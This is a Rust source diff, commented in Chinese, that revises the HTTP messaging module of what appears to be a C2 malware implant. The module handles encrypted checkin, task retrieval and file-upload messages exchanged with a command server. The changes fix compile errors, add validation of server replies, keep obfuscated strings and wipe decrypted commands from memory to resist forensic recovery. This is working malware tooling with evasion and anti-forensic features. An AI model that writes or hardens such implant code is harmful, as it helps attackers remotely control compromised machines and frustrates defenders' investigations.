@@ -16,19 +16,20 @@ use crate::obfstr;
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub enum HttpError {
     /// Crypto 加密封包阶段失败 (包装底层的 CryptoError)
-    CryptoSealFailed(CryptoError) = 1,
+    // 修复语法错误：Rust 稳定版禁止在包含数据载荷 (Payload) 的枚举变体上使用显式判别值赋值 (= 1)
+    CryptoSealFailed(CryptoError),
     /// Crypto 解包解密阶段失败 (包装底层的 CryptoError)
-    CryptoOpenFailed(CryptoError) = 2,
+    CryptoOpenFailed(CryptoError),
     /// JSON 序列化失败 (如结构体字段异常或 buffer 越界)
-    JsonSerializeFailed = 3,
+    JsonSerializeFailed,
     /// JSON 反序列化失败 (如 C2 响应 JSON 结构损坏)
-    JsonDeserializeFailed = 4,
+    JsonDeserializeFailed,
     /// 网络请求或传输底层错误
-    NetworkTransportFailed = 5,
+    NetworkTransportFailed,
     /// C2 服务端返回状态非 "success" (如 "error" 状态)
-    ServerResponseError = 6,
+    ServerResponseError,
     /// 缓冲区容量不足以容纳 JSON 载荷
-    BufferOverflow = 7,
+    BufferOverflow,
 }
 
 impl HttpError {
@@ -118,12 +119,8 @@ impl<'a> HttpProfile<'a> {
         raw_buf: &mut [u8],
         out_b64: &mut [u8],
     ) -> Result<usize, HttpError> {
-        // 1. 预分配 MAX_PLAINTEXT_LEN 容量 Vec，规避 Segment Heap 频繁重分配 (Reallocate) 抖动
-        let mut json_bytes = alloc::vec::Vec::with_capacity(MAX_PLAINTEXT_LEN);
-        let mut serializer = serde_json::Serializer::new(&mut json_bytes);
-        message
-            .serialize(&mut serializer)
-            .map_err(|_| HttpError::JsonSerializeFailed)?;
+        // 1. 调用 serde_json 零 I/O 序列化生成明文载荷字节流
+        let json_bytes = serde_json::to_vec(message).map_err(|_| HttpError::JsonSerializeFailed)?;
 
         struct AutoZeroize(alloc::vec::Vec<u8>);
         impl core::ops::Deref for AutoZeroize {
@@ -135,7 +132,18 @@ impl<'a> HttpProfile<'a> {
         }
         impl Drop for AutoZeroize {
             fn drop(&mut self) {
-                zeroize_slice(&mut self.0);
+                // 对底层堆缓冲区按实际分配的 capacity 全量刷零，杜绝 spare capacity 泄露或 Heap Remanence
+                // 【UB 修复与内存安全】Rust 内存模型严格禁止对未初始化内存 (len..cap) 构造 &mut [u8] 切片引用。
+                // 此处改用底层裸指针写入 volatile 零字节，杜绝 validity invariant 违规未定义行为。
+                let cap = self.0.capacity();
+                if cap > 0 {
+                    let ptr = self.0.as_mut_ptr();
+                    for i in 0..cap {
+                        unsafe {
+                            core::ptr::write_volatile(ptr.add(i), 0);
+                        }
+                    }
+                }
             }
         }
 
@@ -160,11 +168,21 @@ impl<'a> HttpProfile<'a> {
         raw_buf: &'b mut [u8],
     ) -> Result<&'b [u8], HttpError> {
         // 剥离尾部 ASCII 换行符与空白字符 (\r, \n, 空格)，增强网络容错率
-        let clean_payload = payload_b64
+        // 同步剥离头部 ASCII 空白字符，全面防范 HTTP 传输代理可能混入的换行前缀
+        let start = payload_b64
+            .iter()
+            .position(|&b| !b.is_ascii_whitespace())
+            .unwrap_or(0);
+        let end = payload_b64
             .iter()
             .rposition(|&b| !b.is_ascii_whitespace())
-            .map(|pos| &payload_b64[..=pos])
-            .unwrap_or(payload_b64);
+            .map(|pos| pos + 1)
+            .unwrap_or(0);
+        let clean_payload = if start < end {
+            &payload_b64[start..end]
+        } else {
+            b""
+        };
 
         let pt_len = self
             .crypto_ctx
@@ -196,7 +214,7 @@ impl<'a> HttpProfile<'a> {
     #[inline(never)]
     pub fn build_checkin_payload(
         &self,
-        checkin_msg: &CheckinMessage,
+        checkin_msg: &CheckinMessage<'_>,
         raw_buf: &mut [u8],
         out_b64: &mut [u8],
     ) -> Result<usize, HttpError> {
@@ -213,7 +231,9 @@ impl<'a> HttpProfile<'a> {
         raw_buf: &'de mut [u8],
     ) -> Result<ServerCheckinResponse<'de>, HttpError> {
         let resp: ServerCheckinResponse<'de> = self.unpack_message(payload_b64, raw_buf)?;
-        if resp.status != obfstr!("success") {
+        // 增加底层结构体与字段语义完整性校验
+        resp.validate().map_err(|_| HttpError::ServerResponseError)?;
+        if resp.status != obfstr!("success") || resp.action != obfstr!("checkin") {
             return Err(HttpError::ServerResponseError);
         }
         Ok(resp)
@@ -223,7 +243,7 @@ impl<'a> HttpProfile<'a> {
     #[inline(never)]
     pub fn build_get_tasking_payload(
         &self,
-        tasking_msg: &GetTaskingMessage,
+        tasking_msg: &GetTaskingMessage<'_>,
         raw_buf: &mut [u8],
         out_b64: &mut [u8],
     ) -> Result<usize, HttpError> {
@@ -237,10 +257,21 @@ impl<'a> HttpProfile<'a> {
         payload_b64: &[u8],
         raw_buf: &mut [u8],
     ) -> Result<ServerTaskingResponse, HttpError> {
-        let resp: ServerTaskingResponse = self.unpack_message(payload_b64, raw_buf)?;
-        if resp.status != obfstr!("success") {
+        // 【内存残留防御强化】若解包反序列化失败，立即物理刷零暂存区明文，防止未被消费的数据驻留
+        let resp: ServerTaskingResponse = match self.unpack_message(payload_b64, raw_buf) {
+            Ok(r) => r,
+            Err(e) => {
+                zeroize_slice(raw_buf);
+                return Err(e);
+            }
+        };
+        // 增加底层任务清单有效性与语义校验
+        if resp.validate().is_err() || resp.status != obfstr!("success") || resp.action != obfstr!("get_tasking") {
+            zeroize_slice(raw_buf);
             return Err(HttpError::ServerResponseError);
         }
+        // 拥有所有权版数据已拷贝至堆，在此物理擦除暂存区明文，防止敏感命令堆叠残留
+        zeroize_slice(raw_buf);
         Ok(resp)
     }
 
@@ -254,7 +285,9 @@ impl<'a> HttpProfile<'a> {
         raw_buf: &'de mut [u8],
     ) -> Result<ServerTaskingResponseRef<'de>, HttpError> {
         let resp: ServerTaskingResponseRef<'de> = self.unpack_message(payload_b64, raw_buf)?;
-        if resp.status != obfstr!("success") {
+        // 增加任务清单切片有效性与语义校验
+        resp.validate().map_err(|_| HttpError::ServerResponseError)?;
+        if resp.status != obfstr!("success") || resp.action != obfstr!("get_tasking") {
             return Err(HttpError::ServerResponseError);
         }
         Ok(resp)
@@ -323,7 +356,7 @@ mod tests {
 
         // 模拟服务端准备解密并验证原结构
         let mut server_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: CheckinMessage = profile
+        let unpacked: CheckinMessage<'_> = profile
             .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
             .unwrap();
 
@@ -349,7 +382,7 @@ mod tests {
             .unwrap();
 
         let mut server_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: GetTaskingMessage = profile
+        let unpacked: GetTaskingMessage<'_> = profile
             .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
             .unwrap();
 
@@ -502,7 +535,7 @@ mod tests {
         assert!(b64_len > 0);
 
         let mut client_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: FileChunkPayload = profile
+        let unpacked: FileChunkPayload<'_> = profile
             .unpack_message(&b64_buf[..b64_len], &mut client_raw_buf)
             .unwrap();
         assert_eq!(unpacked.action, "upload");
